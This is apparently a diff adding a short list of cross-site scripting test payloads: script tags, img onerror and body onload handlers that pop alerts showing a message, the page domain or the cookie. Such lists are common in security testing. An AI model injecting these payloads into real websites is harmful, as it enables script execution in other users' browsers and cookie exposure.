@@ -1,0 +1,6 @@
+<img src="x" onerror="alert('You have been hacked!')" />
+<SCRIPT>alert('You have been hacked!')</SCRIPT>
+<script>alert('You have been hacked!');</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.cookie)>
+<body onload=alert('Bugbot19')>
